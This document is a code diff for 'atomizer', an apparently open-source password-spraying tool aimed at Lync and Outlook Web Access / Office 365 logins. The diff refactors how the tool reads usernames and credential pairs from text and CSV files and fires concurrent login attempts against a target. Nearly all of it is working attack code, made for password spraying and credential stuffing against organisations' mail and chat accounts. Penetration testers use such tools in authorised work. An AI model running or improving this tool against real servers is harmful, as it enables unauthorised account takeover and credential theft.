@@ -3,7 +3,7 @@
 """
 Usage:
     atomizer (lync|owa) <target> <password> --userfile USERFILE [--threads THREADS] [--debug]
-    atomizer (lync|owa) <target> --csvfile CSVFILE [--threads THREADS] [--debug]
+    atomizer (lync|owa) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --recon [--debug]
     atomizer -h | --help
     atomizer -v | --version
@@ -20,6 +20,8 @@ Options:
     -t, --threads THREADS    number of concurrent threads to use [default: 3]
     -d, --debug              enable debug output
     --recon                  only collect info, don't password spray
+    --user-row-name NAME     username row title in CSV file [default: Email Address]
+    --pass-row-name NAME     password row title in CSV file [default: Password]
 """
 
 import logging
@@ -65,26 +67,32 @@ class Atomizer:
             target=self.target
         )
 
-    async def atomize(self, inputfile, password=None):
+    async def atomize(self, userfile, password):
         log = logging.getLogger('atomize')
         log.debug('atomizing...')
 
-        with open(inputfile) as ifile:
-            if inputfile.endswith('.csv') and not password:
-                reader = csv.DictReader(ifile)
-                log.debug('creating executor tasks from csv file')
+        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth
 
-                blocking_tasks = [
-                    self.loop.run_in_executor(self.executor, self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth, partial(row['Email Address'], row['Password']))
-                    for row in reader
-                ]
+        log.debug('creating executor tasks')
+        blocking_tasks = [
+            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=password))
+            for username in userfile
+        ]
 
-            else:
-                log.debug('creating executor tasks')
-                blocking_tasks = [
-                    self.loop.run_in_executor(self.executor, self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth, partial(email.strip(), password))
-                    for user in ifile
-                ]
+        log.debug('waiting for executor tasks')
+        await asyncio.wait(blocking_tasks)
+        log.debug('exiting')
+
+    async def atomize_csv(self, csvreader: csv.DictReader, user_row_name='Email Address', pass_row_name='Password'):
+        log = logging.getLogger('atomize_csv')
+        log.debug('atomizing...')
+
+        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth
+
+        blocking_tasks = [
+            self.loop.run_in_executor(self.executor, partial(auth_function, username=row[user_row_name], password=row[pass_row_name]))
+            for row in csvreader
+        ]
 
         log.debug('waiting for executor tasks')
         await asyncio.wait(blocking_tasks)
@@ -96,7 +104,6 @@ class Atomizer:
 
 if __name__ == "__main__":
     args = docopt(__doc__, version="0.0.1dev")
-    print(args)
     loop = asyncio.get_event_loop()
 
     atomizer = Atomizer(
@@ -106,24 +113,41 @@ if __name__ == "__main__":
         debug=args['--debug']
     )
 
+    logging.debug(args)
+
+    if args['--userfile'] or args['--csvfile']:
+        inputfile = Path(args['--userfile'] if args['--userfile'] else args['--csvfile'])
+        if not inputfile.exists() or not inputfile.is_file():
+            logging.error(print_bad("Path to --userfile/--csvfile invalid!"))
+            sys.exit(1)
+
     if args['lync']:
         atomizer.lync()
     elif args['owa']:
         atomizer.owa()
 
     if not args['--recon']:
-        inputfile = Path(args['--userfile'] if args['--userfile'] else args['--csvfile'])
-        if not inputfile.exists() or not inputfile.is_file():
-            print_bad("Path to --userfile/--csvfile invalid!")
-            sys.exit(1)
-
         for sig in (signal.SIGINT, signal.SIGTERM):
             loop.add_signal_handler(sig, atomizer.shutdown)
 
-        loop.run_until_complete(
-            atomizer.atomize(
-                inputfile=args['--userfile'] if args['--userfile'] else args['--csvfile'],
-                password=args['<password>']
-            )
-        )
+        if args['--csvfile']:
+            with open(args['--csvfile']) as csvfile:
+                    reader = csv.DictReader(csvfile)
+                    loop.run_until_complete(
+                        atomizer.atomize_csv(
+                            csvreader=reader,
+                            user_row_name=args['--user-row-name'],
+                            pass_row_name=args['--pass-row-name']
+                        )
+                    )
+
+        elif args['--userfile']:
+            with open(args['--userfile']) as userfile:
+                    loop.run_until_complete(
+                        atomizer.atomize(
+                            userfile=userfile,
+                            password=args['<password>']
+                        )
+                    )
+
         atomizer.shutdown()
